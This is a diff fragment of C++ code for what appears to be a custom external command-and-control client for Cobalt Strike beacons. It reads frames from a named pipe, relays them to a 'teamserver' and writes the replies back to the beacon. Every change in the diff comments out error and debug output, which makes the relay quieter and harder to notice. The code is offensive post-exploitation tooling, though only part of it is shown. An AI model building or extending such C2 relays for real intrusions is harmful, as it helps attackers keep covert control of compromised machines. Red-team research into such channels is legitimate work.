@@ -12,30 +12,30 @@ DWORD read_frame(HANDLE my_handle, char* buffer, DWORD max) {
 	DWORD size = 0, temp = 0, total = 0;
 
 	if (!ReadFile(my_handle, (char*)&size, 4, &temp, NULL)) {
-		std::cerr << "Failed to read frame size. Error: " << GetLastError() << std::endl;
+		//std::cerr << "Failed to read frame size. Error: " << GetLastError() << std::endl;
 		return 0;
 	}
 
 	if (temp != 4) {
-		std::cerr << "Expected 4 bytes for size, got " << temp << std::endl;
+		//std::cerr << "Expected 4 bytes for size, got " << temp << std::endl;
 		return 0;
 	}
 
 	//std::cout << "Frame size: " << size << std::endl;
 
 	if (size > max) {
-		std::cerr << "Frame size " << size << " exceeds buffer max " << max << std::endl;
+		//std::cerr << "Frame size " << size << " exceeds buffer max " << max << std::endl;
 		return 0;
 	}
 
 	while (total < size) {
 		if (!ReadFile(my_handle, buffer + total, size - total, &temp, NULL)) {
-			std::cerr << "ReadFile failed while reading frame data. Error: " << GetLastError() << std::endl;
+			//std::cerr << "ReadFile failed while reading frame data. Error: " << GetLastError() << std::endl;
 			return 0;
 		}
 
 		if (temp == 0) {
-			std::cerr << "Pipe closed before reading complete frame." << std::endl;
+			////std::cerr << "Pipe closed before reading complete frame." << std::endl;
 			break;
 		}
 
@@ -91,8 +91,8 @@ void pipeLoop(std::vector<uint8_t> clientId) {
 		std::vector<uint8_t> vec(buffer, buffer + read);
 
 		//std::cout << "Data from Pipe: ";
-		printHexVector(vec);
-		std::cout << std::endl;
+		//printHexVector(vec);
+		//std::cout << std::endl;
 
 		//send with chunker
 		sendBeaconDataToTeamserver(
@@ -109,8 +109,8 @@ void pipeLoop(std::vector<uint8_t> clientId) {
 		);
 
 		//std::cout << "[?] Data being written to pipe: ";
-		printHexVector(dataFromTeamserver);
-		std::cout << std::endl;
+		//printHexVector(dataFromTeamserver);
+		//std::cout << std::endl;
 
 		//convert to char * as that's what write_frame wants
 		char* dataForBeacon = reinterpret_cast<char*>(dataFromTeamserver.data());
